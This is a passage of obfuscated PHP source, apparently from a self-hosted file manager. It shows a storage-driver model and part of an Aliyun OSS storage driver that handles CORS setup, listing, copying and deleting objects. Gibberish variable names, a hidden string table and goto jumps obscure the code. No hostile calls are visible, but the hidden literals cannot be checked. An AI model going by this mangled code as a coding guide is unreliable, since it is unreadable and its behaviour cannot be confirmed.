implode($ôŠíÈ©Ş[50], $À«ÎÊş¶); $»Ê¯ñäæ = Cache::get($„¶¸ÄÁ ); if ($»Ê¯ñäæ) { return $»Ê¯ñäæ; } $Ğ…‘Ò¥ = array($ôŠíÈ©Ş[827] => $ôŠíÈ©Ş[399], $ôŠíÈ©Ş[2146] => $ôŠíÈ©Ş[76]); $å‘ò•üç = array($ôŠíÈ©Ş[827] => array($ôŠíÈ©Ş[7], $À«ÎÊş¶)); $»Ê¯ñäæ = Model($ôŠíÈ©Ş[799])->field($Ğ…‘Ò¥)->where($å‘ò•üç)->group($ôŠíÈ©Ş[827])->select(); $»Ê¯ñäæ = array_to_keyvalue($»Ê¯ñäæ, $ôŠíÈ©Ş[399], $ôŠíÈ©Ş[76]); Cache::set($„¶¸ÄÁ , $»Ê¯ñäæ, 600); return $»Ê¯ñäæ; } public function getConfig($Ñ…Ä×Î) { $º÷šõÔ = parent::listData($Ñ…Ä×Î); return json_decode($º÷šõÔ[$_SERVER[ïëó©ÒÚ][6]], !0); } public function update($îæ•ŠòÄ, $û¿š­»À) { $ş•ìÑÃ“ =& $_SERVER[ïëó©ÒÚ]; $çÉñäğŒ = $û¿š­»À[$ş•ìÑÃ“[32]]; $¼°ŒŠ¼¦ = array_to_keyvalue(parent::listData(), $ş•ìÑÃ“[32]); if (isset($¼°ŒŠ¼¦[$çÉñäğŒ]) && $¼°ŒŠ¼¦[$çÉñäğŒ][$ş•ìÑÃ“[399]] != $îæ•ŠòÄ) { return !1; } $this->checkPwd($îæ•ŠòÄ, $û¿š­»À); if (isset($û¿š­»À[$ş•ìÑÃ“[2147]]) && $û¿š­»À[$ş•ìÑÃ“[2147]] == $ş•ìÑÃ“[88]) { $this->checkConfig($û¿š­»À); } unset($û¿š­»À[$ş•ìÑÃ“[2147]]); $Û‘³‰‘Æ = parent::update($îæ•ŠòÄ, $û¿š­»À); if ($Û‘³‰‘Æ && $û¿š­»À[$ş•ìÑÃ“[37]]) { $ˆ“ëÀ£‘ = 0; foreach ($¼°ŒŠ¼¦ as $¨ÉÏ±Çó) { if ($¨ÉÏ±Çó[$ş•ìÑÃ“[37]] && $¨ÉÏ±Çó[$ş•ìÑÃ“[399]] != $îæ•ŠòÄ) { $ˆ“ëÀ£‘ = $¨ÉÏ±Çó[$ş•ìÑÃ“[399]]; parent::update($¨ÉÏ±Çó[$ş•ìÑÃ“[399]], array($ş•ìÑÃ“[37] => 0)); } } $this->updateBackup($îæ•ŠòÄ, $ˆ“ëÀ£‘); } return $Û‘³‰‘Æ; } public function add($ø™©«¶) { $“±¬ŸØ =& $_SERVER[ïëó©ÒÚ]; $À–¾£Óİ = array_to_keyvalue(parent::listData(), $“±¬ŸØ[32]); if (isset($À–¾£Óİ[$ø™©«¶[$“±¬ŸØ[32]]])) { return !1; } $this->checkConfig($ø™©«¶); $è­Õ¸ºœ = parent::insert($ø™©«¶); if ($è­Õ¸ºœ && $ø™©«¶[$“±¬ŸØ[37]]) { foreach ($À–¾£Óİ as $µ¤ïò­Á) { if ($µ¤ïò­Á[$“±¬ŸØ[37]]) { parent::update($µ¤ïò­Á[$“±¬ŸØ[399]], array($“±¬ŸØ[37] => 0)); } } } return $è­Õ¸ºœ; } public function updateBackup($ı¤ˆœ­, $— ‰êé) { $ªË€öÔÌ =& $_SERVER[ïëó©ÒÚ]; if (!$— ‰êé) { return; } $®¼ò«Íß = Model($ªË€öÔÌ[759])->config(); if ($®¼ò«Íß[$ªË€öÔÌ[1631]] != $ªË€öÔÌ[88] || $®¼ò«Íß[$ªË€öÔÌ[762]] != $— ‰êé) { return; } $¨æ‰è× = Model($ªË€öÔÌ[780])->get($ªË€öÔÌ[790]); $¨æ‰è× = json_decode($¨æ‰è×, !0); if (!$¨æ‰è×) { return; } $¨æ‰è×[$ªË€öÔÌ[762]] = $ı¤ˆœ­; Model($ªË€öÔÌ[780])->set(array($ªË€öÔÌ[790] => $¨æ‰è×)); } public function checkPwd($–ıÈ÷µ, &$ô‚”ãİÓ) { $ ñœºÃö =& $_SERVER[ïëó©ÒÚ]; if (empty($ô‚”ãİÓ[$ ñœºÃö[6]])) { return; } $÷Î¨—ÛŸ = json_decode($ô‚”ãİÓ[$ ñœºÃö[6]], !0); $…É˜ê = $ ñœºÃö[12]; $Ï”×Ä = array($ ñœºÃö[2148], $ ñœºÃö[2149], $ ñœºÃö[892]); foreach ($Ï”×Ä as $Ê¨±éŞ ) { if (isset($÷Î¨—ÛŸ[$Ê¨±éŞ ])) { $…É˜ê = $Ê¨±éŞ ; break; } } if (!$…É˜ê) { return; } $â©Ú‹Ç = $this->getConfig($–ıÈ÷µ); $Æ¢¦ÔÔ± = $â©Ú‹Ç[$…É˜ê]; $Î­™•ã = $÷Î¨—ÛŸ[$…É˜ê]; if ($Î­™•ã == str_repeat($ ñœºÃö[188], strlen($Æ¢¦ÔÔ±))) { $÷Î¨—ÛŸ[$…É˜ê] = $Æ¢¦ÔÔ±; $ô‚”ãİÓ[$ ñœºÃö[6]] = json_encode($÷Î¨—ÛŸ); } else { if ($Î­™•ã != $Æ¢¦ÔÔ±) { $ô‚”ãİÓ[$ ñœºÃö[2147]] = $ ñœºÃö[88]; } } } public function checkConfig(&$šÙ›Õ‡, $¹ìéÛ±Î = false) { $·¸õÃ®Õ =& $_SERVER[ïëó©ÒÚ]; $»»ˆ×ôè = strtolower($šÙ›Õ‡[$·¸õÃ®Õ[95]]); $€ş½ä† = json_decode($šÙ›Õ‡[$·¸õÃ®Õ[6]], !0); foreach ($€ş½ä† as $‚Ù½€ôä => $ø¯š ”Ë) { $€ş½ä†[$‚Ù½€ôä] = trim($ø¯š ”Ë); } $€ş½ä†[$·¸õÃ®Õ[2150]] = rand_string(6); $ç°¬Çı = $GLOBALS[$·¸õÃ®Õ[6]][$·¸õÃ®Õ[89]][$·¸õÃ®Õ[836]]; $¤½¸à¤… = isset($ç°¬Çı[$»»ˆ×ôè]) ? $ç°¬Çı[$»»ˆ×ôè] : ucfirst($»»ˆ×ôè); $™¨”Í¶² = $·¸õÃ®Õ[74] . $¤½¸à¤…; if (!$¤½¸à¤… || !class_exists($™¨”Í¶²)) { if ($¹ìéÛ±Î) { return LNG($·¸õÃ®Õ[2151]); } write_log(array($·¸õÃ®Õ[2152], $šÙ›Õ‡, get_caller_info()), $·¸õÃ®Õ[2153]); show_json(LNG($·¸õÃ®Õ[2151]), !1, $šÙ›Õ‡); } $üËõåğá = new $™¨”Í¶²($€ş½ä†); if (in_array($»»ˆ×ôè, $üËõåğá->objectDriver)) { if (!$üËõåğá->isBucketCors() && !$üËõåğá->setBucketCors()) { $ºğß³¢Ş = LNG($·¸õÃ®Õ[2154]); $ºğß³¢Ş .= $·¸õÃ®Õ[2155] . LNG($·¸õÃ®Õ[2156]); if ($¹ìéÛ±Î) { return $ºğß³¢Ş; } show_json($ºğß³¢Ş, !1); } } $óÊã¬š = rtrim($€ş½ä†[$·¸õÃ®Õ[1184]], $·¸õÃ®Õ[8]) . $·¸õÃ®Õ[8]; $¿Ëµ’İ  = $üËõåğá->getPath($óÊã¬š . $·¸õÃ®Õ[1246]); if (!$üËõåğá->mkfile($¿Ëµ’İ )) { if ($¹ìéÛ±Î) { return LNG($·¸õÃ®Õ[2154]); } show_json(LNG($·¸õÃ®Õ[2154]), !1); } $€ş½ä†[$·¸õÃ®Õ[1184]] = $óÊã¬š; $šÙ›Õ‡[$·¸õÃ®Õ[6]] = json_encode($€ş½ä†); $šÙ›Õ‡[$·¸õÃ®Õ[95]] = $¤½¸à¤…; return !0; } public function driverListSystem() { $šÃİ¹ô =& $_SERVER[ïëó©ÒÚ]; $»ğğÆ’¥ = parent::listData(); $éí¾ÂŞş = array(); foreach ($»ğğÆ’¥ as $ËÛğ¼ÁÊ) { unset($ËÛğ¼ÁÊ[$šÃİ¹ô[200]], $ËÛğ¼ÁÊ[$šÃİ¹ô[85]]); $ËÛğ¼ÁÊ[$šÃİ¹ô[6]] = json_decode($ËÛğ¼ÁÊ[$šÃİ¹ô[6]], !0); $éí¾ÂŞş[] = $ËÛğ¼ÁÊ; } return $éí¾ÂŞş; } public function defaultDriver() { $Êèûèœ“ =& $_SERVER[ïëó©ÒÚ]; $‚ˆ£¾±Ù = parent::listData(); $€Ï¢çØ = array_filter_by_field($‚ˆ£¾±Ù, $Êèûèœ“[37], 1); $€Ï¢çØ = $€Ï¢çØ[0]; if ($€Ï¢çØ) { $€Ï¢çØ[$Êèûèœ“[6]] = json_decode($€Ï¢çØ[$Êèûèœ“[6]], !0); } return $€Ï¢çØ; } public function driverInfo($¤«éÎå) { $Õï•Óğ =& $_SERVER[ïëó©ÒÚ]; $³ü¿ÓÊ› = array_to_keyvalue(parent::listData(), $Õï•Óğ[399]); if (!isset($³ü¿ÓÊ›[$¤«éÎå])) { return !1; } $™ñª˜ê = $³ü¿ÓÊ›[$¤«éÎå]; $™ñª˜ê[$Õï•Óğ[6]] = json_decode($™ñª˜ê[$Õï•Óğ[6]], !0); return $™ñª˜ê; } public function remove($ËÊ…¸ªø) { $this->removeShareItems($ËÊ…¸ªø); return parent::remove($ËÊ…¸ªø); } public function removeWithFile($ÊÅíû¢, $Û¡¶ëôÃ) { $ÍƒÆ«Û€ =& $_SERVER[ïëó©ÒÚ]; $û¡­–Ò = array($ÍƒÆ«Û€[827] => $ÊÅíû¢); $í¸ˆòƒ = Model($ÍƒÆ«Û€[480])->where($û¡­–Ò)->count(); $ÚˆíïÇ = Model($ÍƒÆ«Û€[480])->where($û¡­–Ò)->sum($ÍƒÆ«Û€[76]); $ãÚğ‡Ê = $Û¡¶ëôÃ . $ÍƒÆ«Û€[2157] . $ÊÅíû¢; $Æ¹ùÈŞŠ = LNG($Û¡¶ëôÃ == $ÍƒÆ«Û€[566] ? $ÍƒÆ«Û€[2158] : $ÍƒÆ«Û€[2159]); $°êÂØÒ« = new TaskFileTransfer($ãÚğ‡Ê, $ÍƒÆ«Û€[2153], $í¸ˆòƒ, $Æ¹ùÈŞŠ . "\50{$ÊÅíû¢}\x29"); $°êÂØÒ«->task[$ÍƒÆ«Û€[773]] = (double) $ÚˆíïÇ; $èÆØô” = KodIO::defaultDriver(); $¾•íó© = $èÆØô”[$ÍƒÆ«Û€[399]]; $É†¯âı· = "\x7b\x69\x6f\x3a{$¾•íó©}\x7d\57"; $ÁÓ¶£üŸ = !0; $ÀœÎâç = array(); $§áëÎµÃ = Model($ÍƒÆ«Û€[199])->where($û¡­–Ò)->field($ÍƒÆ«Û€[2160])->select(); foreach ($§áëÎµÃ as $¬¼ŒçˆÔ) { $ôæÕ¯øÎ = $¬¼ŒçˆÔ[$ÍƒÆ«Û€[84]]; $£³ÔÖ‚‘ = $É†¯âı· . str_replace("\x7b\x69\157\72{$ÊÅíû¢}\x7d\x2f", $ÍƒÆ«Û€[12], $ôæÕ¯øÎ); if (!IO::exist($ôæÕ¯øÎ)) { $ÀœÎâç[] = $¬¼ŒçˆÔ[$ÍƒÆ«Û€[477]]; $°êÂØÒ«->updateFileEnd($¬¼ŒçˆÔ[$ÍƒÆ«Û€[32]], $¬¼ŒçˆÔ[$ÍƒÆ«Û€[76]]); continue; } if (IO::exist($£³ÔÖ‚‘)) { $°êÂØÒ«->updateFileEnd($¬¼ŒçˆÔ[$ÍƒÆ«Û€[32]], $¬¼ŒçˆÔ[$ÍƒÆ«Û€[76]]); continue; } if (!IO::move($ôæÕ¯øÎ, get_path_father($£³ÔÖ‚‘))) { $ÁÓ¶£üŸ = !1; break; } $û¡­–Ò = array($ÍƒÆ«Û€[477] => $¬¼ŒçˆÔ[$ÍƒÆ«Û€[477]]); $£Ã²Šö = array($ÍƒÆ«Û€[827] => $¾•íó©, $ÍƒÆ«Û€[84] => $£³ÔÖ‚‘); Model($ÍƒÆ«Û€[199])->where($û¡­–Ò)->save($£Ã²Šö); } $this->removeByFileID($ÀœÎâç); if (!$ÁÓ¶£üŸ) { $°êÂØÒ«->stop($ãÚğ‡Ê); return !1; } $°êÂØÒ«->end(); if ($Û¡¶ëôÃ == $ÍƒÆ«Û€[1802]) { $this->remove($ÊÅíû¢); } } public function progress($­•¿¼ôº, $åá‡Î«€) { return Task::get($åá‡Î«€ . $_SERVER[ïëó©ÒÚ][2157] . $­•¿¼ôº); } private function removeByFileID($‰‡¢ÚÙö = array()) { $¢´¿ˆ “ =& $_SERVER[ïëó©ÒÚ]; if (empty($‰‡¢ÚÙö)) { return; } $ŠÍû¢ï = array($¢´¿ˆ “[477] => array($¢´¿ˆ “[7], $‰‡¢ÚÙö)); $¤„¿°ª  = Model($¢´¿ˆ “[1330])->where($ŠÍû¢ï)->field($¢´¿ˆ “[411])->select(); if (!$¤„¿°ª ) { return; } $¤„¿°ª  = array_to_keyvalue($¤„¿°ª , $¢´¿ˆ “[12], $¢´¿ˆ “[411]); foreach ($¤„¿°ª  as $Ù³Æä) { Model($¢´¿ˆ “[425])->removeNow($Ù³Æä, !1); } } private function removeShareItems($Ãö÷ı ğ) { $ÇœáĞó =& $_SERVER[ïëó©ÒÚ]; $’Ø•±’Õ = "\173\x69\157\x3a{$Ãö÷ı ğ}\175\x2f"; $ˆ·ûÊË· = array($ÇœáĞó[411] => 0, $ÇœáĞó[1179] => array($ÇœáĞó[383], "{$’Ø•±’Õ}\45")); $ÑĞÈ­Ó  = Model($ÇœáĞó[1813])->where($ˆ·ûÊË·)->field($ÇœáĞó[498])->select(); if (empty($ÑĞÈ­Ó )) { return; } $·ŸÕ© = array_to_keyvalue($ÑĞÈ­Ó , $ÇœáĞó[12], $ÇœáĞó[498]); Model($ÇœáĞó[610])->remove($·ŸÕ©); } } goto AÜ‚è¹ÇÌ; d¤®øÀ’Í: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($ØÈø öì) { parent::__construct(); include_once SDK_DIR . $_SERVER[ïëó©ÒÚ][1385]; $this->_init($ØÈø öì); } public function _init($Ş£Öé›ú) { $ÊÉÂ¦ö =& $_SERVER[ïëó©ÒÚ]; foreach ($Ş£Öé›ú as $á«‚î¨µ => $´¶¼ûçÒ) { if (isset($this->{$á«‚î¨µ})) { $this->{$á«‚î¨µ} = $´¶¼ûçÒ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÊÉÂ¦ö[1386] . LNG($ÊÉÂ¦ö[1387])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $üä¦Õ©‰ =& $_SERVER[ïëó©ÒÚ]; $¥‚©¯ÃÚ = new OSS\Model\CorsConfig(); $ñ¡ç©×é = new OSS\Model\CorsRule(); $ñ¡ç©×é->addAllowedOrigin($üä¦Õ©‰[1388]); $ñ¡ç©×é->addAllowedMethod($üä¦Õ©‰[1389]); $ñ¡ç©×é->addAllowedMethod($üä¦Õ©‰[1390]); $ñ¡ç©×é->addAllowedMethod($üä¦Õ©‰[1391]); $ñ¡ç©×é->addAllowedMethod($üä¦Õ©‰[1392]); $ñ¡ç©×é->addAllowedMethod($üä¦Õ©‰[160]); $ñ¡ç©×é->setMaxAgeSeconds(600); $ñ¡ç©×é->addExposeHeader($üä¦Õ©‰[1393]); $ñ¡ç©×é->addAllowedHeader($üä¦Õ©‰[1388]); $¥‚©¯ÃÚ->addRule($ñ¡ç©×é); try { $this->client->putBucketCors($this->bucket, $¥‚©¯ÃÚ); } catch (OSS\Core\OssException $é†éñ‚µ) { return !1; } return !0; } public function getBucketCors() { $µùÂÙÅ¨ =& $_SERVER[ïëó©ÒÚ]; $µ Ûüğº = null; try { $µ Ûüğº = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $şâ“÷´ó) { return null; } if (!$µ Ûüğº || !($¶û–Á±¸ = $µ Ûüğº->getRules())) { return null; } $å’Úµ—ü = $¶û–Á±¸[0]->getAllowedOrigins(); $ã€ŒÈ™™ = $¶û–Á±¸[0]->getAllowedMethods(); $¼íóà™ = $¶û–Á±¸[0]->getMaxAgeSeconds(); $…ç¯—®© = $¶û–Á±¸[0]->getExposeHeaders(); $‰ûù— = $¶û–Á±¸[0]->getAllowedHeaders(); return array($µùÂÙÅ¨[187] => isset($å’Úµ—ü[0]) ? $å’Úµ—ü[0] : $µùÂÙÅ¨[12], $µùÂÙÅ¨[191] => $ã€ŒÈ™™, $µùÂÙÅ¨[1394] => $¼íóà™, $µùÂÙÅ¨[1395] => isset($…ç¯—®©[0]) ? $…ç¯—®©[0] : $µùÂÙÅ¨[12], $µùÂÙÅ¨[189] => isset($‰ûù—[0]) ? $‰ûù—[0] : $µùÂÙÅ¨[12]); } public function isBucketCors() { $¡‘ÆÚ¼İ =& $_SERVER[ïëó©ÒÚ]; $Åï¿­Ë = $this->getBucketCors(); if (!$Åï¿­Ë || !is_array($Åï¿­Ë)) { return !1; } if ($Åï¿­Ë[$¡‘ÆÚ¼İ[187]] != $¡‘ÆÚ¼İ[188] || $Åï¿­Ë[$¡‘ÆÚ¼İ[189]] != $¡‘ÆÚ¼İ[188]) { return !1; } $¬ºÄ¦ê = array_map($¡‘ÆÚ¼İ[190], $Åï¿­Ë[$¡‘ÆÚ¼İ[191]]); if (!is_array($¬ºÄ¦ê)) { $¬ºÄ¦ê = array(); } $áÚŞ Ô = array($¡‘ÆÚ¼İ[192], $¡‘ÆÚ¼İ[193], $¡‘ÆÚ¼İ[194], $¡‘ÆÚ¼İ[195], $¡‘ÆÚ¼İ[196]); $—ù¦àí… = array_diff($áÚŞ Ô, $¬ºÄ¦ê); return empty($—ù¦àí…); } public function mkfile($ğùäüş, $³Âà£™ = '', $âÓ¥ÔÏ” = REPEAT_RENAME) { $€—ŒáîÃ = $this->setContent($ğùäüş, $³Âà£™); if ($€—ŒáîÃ !== !1) { return $this->getPathOuter($ğùäüş); } return !1; } public function mkdir($Ù™öü®é, $Ÿşêú‡æ = REPEAT_SKIP) { if ($Ÿşêú‡æ && $this->_isFolder($Ù™öü®é)) { return $this->getPathOuter($Ù™öü®é); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ù™öü®é)); } catch (OSS\Core\OssException $’ÜïÛ½Ø) { return !1; } return $this->getPathOuter($Ù™öü®é); } private function fileList($ğ”âÕŒí, $ëÁ¯¬ò± = '', $‡›ŒÖ—— = 0) { $ûŠ…ïàÈ =& $_SERVER[ïëó©ÒÚ]; $ğ”âÕŒí = trim($ğ”âÕŒí, $ûŠ…ïàÈ[8]); $»¤¸˜Ù = empty($ğ”âÕŒí) && $ğ”âÕŒí !== $ûŠ…ïàÈ[197] ? $ûŠ…ïàÈ[12] : $ğ”âÕŒí . $ûŠ…ïàÈ[8]; $¦Ôş¤Ûµ = $ûŠ…ïàÈ[12]; $˜…õ¼ÒÔ = 1000; $‡ŸÚÚñå = $ÍêìÎš = array(); while (!0) { check_abort(); $¦ãË”ä  = array($ûŠ…ïàÈ[1396] => $ëÁ¯¬ò±, $ûŠ…ïàÈ[1397] => $»¤¸˜Ù, $ûŠ…ïàÈ[1398] => $˜…õ¼ÒÔ, $ûŠ…ïàÈ[1399] => $¦Ôş¤Ûµ); try { $Ê—Ê¥ïû = $this->client->listObjects($this->bucket, $¦ãË”ä ); } catch (OSS\Core\OssException $¡‚ÔâÎ) { break; } $¦Ôş¤Ûµ = $Ê—Ê¥ïû->getNextMarker(); $ğâĞëæ = $Ê—Ê¥ïû->getObjectList(); $¦Û¥ŸÆŸ = $Ê—Ê¥ïû->getPrefixList(); foreach ($ğâĞëæ as $ô×¶ªü¥) { if ($ô×¶ªü¥->getKey() == $»¤¸˜Ù) { continue; } $­îªÃ¯ë = $ô×¶ªü¥->getKey(); $æó®ú… = $ô×¶ªü¥->getSize(); $”äÃş¼Œ = $ô×¶ªü¥->getLastModified(); $â–Œ™êî = $‡›ŒÖ—— ? array($ûŠ…ïàÈ[32] => $­îªÃ¯ë, $ûŠ…ïàÈ[76] => $æó®ú…, $ûŠ…ïàÈ[203] => strtotime($”äÃş¼Œ)) : $­îªÃ¯ë; $ı…óËÄÑ = $æó®ú… == 0 && substr($­îªÃ¯ë, strlen($­îªÃ¯ë) - 1, 1) == $ûŠ…ïàÈ[8] ? !0 : !1; $Ô¸ö´¶è = array($ûŠ…ïàÈ[76] => $æó®ú…, $ûŠ…ïàÈ[1400] => $æó®ú…, $ûŠ…ïàÈ[85] => strtotime($”äÃş¼Œ), $ûŠ…ïàÈ[1401] => $”äÃş¼Œ); $this->cacheMethodInfoSet($­îªÃ¯ë, $ı…óËÄÑ, $Ô¸ö´¶è); if ($ı…óËÄÑ) { $‡ŸÚÚñå[] = $­îªÃ¯ë; continue; } $ÍêìÎš[] = $â–Œ™êî; } foreach ($¦Û¥ŸÆŸ as $¶Ç± §²) { $‡ŸÚÚñå[] = $¶Ç± §²->getPrefix(); $this->cacheMethodInfoSet($¶Ç± §²->getPrefix(), !0); } if ($¦Ôş¤Ûµ === $ûŠ…ïàÈ[12]) { break; } } $this->cacheMethodInfoSet($ğ”âÕŒí, !0); return array($ûŠ…ïàÈ[82] => $‡ŸÚÚñå, $ûŠ…ïàÈ[83] => $ÍêìÎš); } public function copyFile($Ô€Éüú‹, $Õ€Âæ¶Ö) { $˜«Çíµ = $this->size($Ô€Éüú‹); if ($˜«Çíµ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ô€Éüú‹, $this->bucket, $this->pathEncode($Õ€Âæ¶Ö)); } catch (OSS\Core\OssException $¶©Áèû—) { return !1; } return $this->getPathOuter($Õ€Âæ¶Ö); } $”ØêË»º = $this->multiCopyObject($Ô€Éüú‹, $Õ€Âæ¶Ö, $˜«Çíµ); return $”ØêË»º ? $this->getPathOuter($Õ€Âæ¶Ö) : !1; } private function multiCopyObject($çÙ¢³, $ûª»ıÜ¸, $‚—Äá½) { $ÅÅÑ° =& $_SERVER[ïëó©ÒÚ]; try { $’Ô©¬« = array(); if ($­ÒêŒ¸× = $this->hashMd5($çÙ¢³)) { $’Ô©¬« = array(OSS\OssClient::OSS_HEADERS => array($ÅÅÑ°[1402] => $­ÒêŒ¸×)); } $ŠÒĞåŠĞ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ûª»ıÜ¸), $’Ô©¬«); $âÂŸ’¶Ğ = 1; $˜à—Ä = 0; $õ„ÙÄ¼· = array(); $Ú»¸Åé = 1024 * 1024 * 10; $†Ì°Öä = $this->client->generateMultiuploadParts($‚—Äá½, $Ú»¸Åé); foreach ($†Ì°Öä as $À®ÄİÑ => $±¸èöÂÏ) { $œ¥ªùî = $˜à—Ä + (int) $±¸èöÂÏ[$ÅÅÑ°[1403]]; $²ÈŞÛçè = (int) $±¸èöÂÏ[$ÅÅÑ°[337]] + $œ¥ªùî - 1; $òè»µ‡² = array($ÅÅÑ°[1404] => $œ¥ªùî, $ÅÅÑ°[1405] => $²ÈŞÛçè); $õ„ÙÄ¼·[] = $this->client->uploadPartCopy($this->bucket, $çÙ¢³, $this->bucket, $this->pathEncode($ûª»ıÜ¸), $âÂŸ’¶Ğ, $ŠÒĞåŠĞ, $òè»µ‡²); $âÂŸ’¶Ğ = $âÂŸ’¶Ğ + 1; } $ıÔº¼õ = array(); foreach ($õ„ÙÄ¼· as $À®ÄİÑ => $ÍÏÑ½ş•) { $ıÔº¼õ[] = array($ÅÅÑ°[1406] => $À®ÄİÑ + 1, $ÅÅÑ°[1407] => $ÍÏÑ½ş•); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ûª»ıÜ¸), $ŠÒĞåŠĞ, $ıÔº¼õ); } catch (OSS\Core\OssException $µÄÊ†±) { return !1; } return !0; } public function moveFile($à«öÕØ, $™™¢Ü™) { if ($this->copyFile($à«öÕØ, $™™¢Ü™)) { $this->remove($à«öÕØ); return $this->getPathOuter($™™¢Ü™); } return !1; } public function delFile($ù²ÅüÔ÷) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ù²ÅüÔ÷)); } catch (OSS\Core\OssException $º«İ½«é) { return !1; } return !0; } public function delFolder($Ÿ¹Ò¤ã—) { $·šÑÊœ =& $_SERVER[ïëó©ÒÚ]; if (!$this->exist($Ÿ¹Ò¤ã—)) { return !0; } $this->listItemCache = !1; $°ü—©éÖ = $this->fileList($Ÿ¹Ò¤ã—); $this->listItemCache = !0; $¦Ÿ”­£ß = trim($Ÿ¹Ò¤ã—, $·šÑÊœ[8]) . $·šÑÊœ[8]; if (!empty($Ÿ¹Ò¤ã—) && $Ÿ¹Ò¤ã— !== $·šÑÊœ[197] && !in_array($¦Ÿ”­£ß, $°ü—©éÖ[$·šÑÊœ[82]])) { $°ü—©éÖ[$·šÑÊœ[82]][] = $¦Ÿ”­£ß; } $éØ´´²­ = $this->delByBatch($°ü—©éÖ[$·šÑÊœ[83]]); if (!$éØ´´²­) { return !1; } $éØ´´²­ = $this->delByBatch($°ü—©éÖ[$·šÑÊœ[82]]); if (!$éØ´´²­) { return !1; } return $this->delFile($¦Ÿ”­£ß); } private function delByBatch($”€À£Õ–) { foreach (array_chunk($”€À£Õ–, 1000) as $ƒåß‹îÇ) { try { $this->client->deleteObjects($this->bucket, $ƒåß‹îÇ); } catch (OSS\Core\OssException $•Ô‹Òáı) { return !1; } } return !0; } public function rename($¥Ù¿Ãİ¥, $ËˆàË”º) { return $this->renameObject($¥Ù¿Ãİ¥, $ËˆàË”º); } private function fileInfo($ößÜÙÚ, $àòë·ú¤ = false, $¦Åüçªµ = array()) { $ü­ìå–Æ =& $_SERVER[ïëó©ÒÚ]; $ØÆé¥ŞÆ = array($ü­ìå–Æ[32] => $this->pathThis($ößÜÙÚ), $ü­ìå–Æ[84] => $this->getPathOuter($ößÜÙÚ), $ü­ìå–Æ[33] => $ü­ìå–Æ[199], $ü­ìå–Æ[76] => isset($¦Åüçªµ[$ü­ìå–Æ[76]]) ? $¦Åüçªµ[$ü­ìå–Æ[76]] : 0, $ü­ìå–Æ[174] => $this->ext($ößÜÙÚ)); if ($àòë·ú¤) { return $ØÆé¥ŞÆ; } $ØÆé¥ŞÆ[$ü­ìå–Æ[200]] = $ØÆé¥ŞÆ[$ü­ìå–Æ[85]] = 0; $ØÆé¥ŞÆ[$ü­ìå–Æ[201]] = $ØÆé¥ŞÆ[$ü­ìå–Æ[202]] = !0; if (empty($¦Åüçªµ)) { $À¨Øû¦’ = $this->objectMeta($ößÜÙÚ); if (!$À¨Øû¦’) { return $ØÆé¥ŞÆ; } $¦Åüçªµ = array($ü­ìå–Æ[85] => strtotime($À¨Øû¦’[$ü­ìå–Æ[1401]]), $ü­ìå–Æ[76] => $À¨Øû¦’[$ü­ìå–Æ[1400]] + 0); } if (isset($¦Åüçªµ[$ü­ìå–Æ[76]])) { $ØÆé¥ŞÆ[$ü­ìå–Æ[76]] = $¦Åüçªµ[$ü­ìå–Æ[76]]; } if (isset($¦Åüçªµ[$ü­ìå–Æ[85]])) { $ØÆé¥ŞÆ[$ü­ìå–Æ[85]] = $¦Åüçªµ[$ü­ìå–Æ[85]]; } if (isset($¦Åüçªµ[$ü­ìå–Æ[203]]) && !trim($ØÆé¥ŞÆ[$ü­ìå–Æ[85]])) { $ØÆé¥ŞÆ[$ü­ìå–Æ[85]] = $¦Åüçªµ[$ü­ìå–Æ[203]]; } return $ØÆé¥ŞÆ; } private function folderInfo($Ş”ûº×, $Ø‚Ø³Ÿı = false, $å­óİıä = array()) { $‰¨úÕÆ£ =& $_SERVER[ïëó©ÒÚ]; $¶¬‚—Ê = array($‰¨úÕÆ£[32] => $this->pathThis($Ş”ûº×), $‰¨úÕÆ£[84] => $this->getPathOuter($‰¨úÕÆ£[8] . $Ş”ûº×), $‰¨úÕÆ£[33] => $‰¨úÕÆ£[75]); if ($Ø‚Ø³Ÿı) { return $¶¬‚—Ê; } $¶¬‚—Ê[$‰¨úÕÆ£[200]] = $¶¬‚—Ê[$‰¨úÕÆ£[85]] = 0; $¶¬‚—Ê[$‰¨úÕÆ£[201]] = $¶¬‚—Ê[$‰¨úÕÆ£[202]] = !0; if (empty($å­óİıä)) { $Ş”ûº× = rtrim($Ş”ûº×, $‰¨úÕÆ£[8]) . $‰¨úÕÆ£[8]; $œî‹ÏÕÒ = $this->objectMeta($Ş”ûº×); if (!$œî‹ÏÕÒ) { return $¶¬‚—Ê; } $å­óİıä = array($‰¨úÕÆ£[200] => $œî‹ÏÕÒ[$‰¨úÕÆ£[520]][$‰¨úÕÆ£[1408]], $‰¨úÕÆ£[85] => strtotime($œî‹ÏÕÒ[$‰¨úÕÆ£[1401]])); } if (isset($å­óİıä[$‰¨úÕÆ£[85]])) { $¶¬‚—Ê[$‰¨úÕÆ£[85]] = $å­óİıä[$‰¨úÕÆ£[85]]; } if (isset($å­óİıä[$‰¨úÕÆ£[200]])) { $¶¬‚—Ê[$‰¨úÕÆ£[200]] = $å­óİıä[$‰¨úÕÆ£[200]]; } return $¶¬‚—Ê; } public function listPath($²¬ÈÆ€Ì, $¶½¬Ó« = false) { $ˆã ’¹ù =& $_SERVER[ïëó©ÒÚ]; $á´ôèñ¼ = $this->fileList($²¬ÈÆ€Ì, $ˆã ’¹ù[8], !0); foreach ($á´ôèñ¼[$ˆã ’¹ù[82]] as $‡Â§´Õ˜ => $û•ÚåÔò) { $á´ôèñ¼[$ˆã ’¹ù[82]][$‡Â§´Õ˜] = $this->folderInfo($û•ÚåÔò, $¶½¬Ó«, $û•ÚåÔò); } foreach ($á´ôèñ¼[$ˆã ’¹ù[83]] as $‡Â§´Õ˜ => $û•ÚåÔò) { $á´ôèñ¼[$ˆã 